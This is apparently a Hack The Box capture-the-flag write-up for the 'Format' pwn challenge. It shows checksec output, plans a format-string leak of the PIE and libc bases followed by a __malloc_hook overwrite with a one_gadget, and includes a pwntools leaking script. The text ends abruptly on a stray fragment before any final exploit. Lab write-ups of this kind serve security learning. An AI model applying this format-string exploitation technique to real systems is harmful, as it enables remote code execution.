![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0b984a01-c83a-4175-9709-f5819f534595)# Format
## DESCRIPTION:
Can you hear the echo?
## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and not stripped.

```console
┌──(brandy㉿bread-yolk)-[~/Downloads/format_htb]
└─$ file format
format: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5d38e04d29b4aae722164869f3151cea776ce91c, for GNU/Linux 3.2.0, not stripped
```

> BINARY PROTECTIONS

```console
┌──(brandy㉿bread-yolk)-[~/Downloads/format_htb]
└─$ pwn checksec format                                     
[*] '/home/brandy/Downloads/format_htb/format'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

2. After decompiled the binary, it seems we can leak - calculate the piebase and libc base using the format strings vuln.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8e3f2da2-36ef-481e-b471-b432a1dafa77)


3. But there is no BOF, hence we can't do ret2libc here. Also, we can't overwrite the Global Offset Table because RELRO is full.
4. So how to get RCE? We still can utilize `__malloc_hook`.

#### MALLOC HOOK

- **__malloc_hook** is a hook function which is called whenever malloc is called.
- We can use one_gadget and we can trigger them by sending big buffer.
- printf() will use malloc to allocate memory after we sent big buffer.


5. Let's grab the piebase and potential libc.

> Actually there is many potential libc address, but i grabbed the 1st one.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fd8097b8-44e8-4e63-8058-8765319f4a73)


> Many potential pie we can use to calculate the base.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f41313c3-13fb-4455-8ceb-aa392f095f1f)


#### NOTES: In this writeup i won't explain again how to calculate the libc base and piebase again, i've explained this many times, go check my other writeups for explaination.


6. After calculating the piebase and libc base, before overwriting **__malloc_hook** with **one_gadget**, we need to identify the libc used at the remote server so we won't work twice.
7. Well, what I did to identify the remote server is kind of lucky, I guess; maybe there are many ways that are more straightforward.

---

### FLOW

- Do breakrva at the printf() and run the script using GDB args.


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b52c71f9-3ab8-4bfc-95f4-5c5273816744)


> SCRIPT Pt.1

```py
from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

## 0x11f1
gdbscript = '''
init-pwndbg
breakrva 0x11f1
continue
'''.format(**locals())

exe = './format'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
# context.log_level = 'ERROR'
context.log_level = 'INFO'

library = '/lib/x86_64-linux-gnu/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

# # LEAKING POTENTIAL LIBC BASE
sh = start()
for i in range(200):
    sh.sendline('%{}$p'.format(i))
    get = sh.recvline().strip()
    print(str(i), ':', get)
```

> We got _IO_2_1_stdin_

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/23018b14-617e-4abf-aaf3-e6df41379ce2)


- But when i used the leaked **_IO_2_1_stdin_** at the remote server and check it on blukat, it did not found any libc relevant to this.
- Anyway, at the end i got result after sending the **_IO_2_1_stderr_**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/81201f90-1a27-49a4-9ac5-3f6b98aef802)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0491790b-3959-4d42-ab67-f322936d1350)


- But, we need to know the actual libc used, to minimize the probability i used the leaked **_IO_file_jumps**.
bhbi




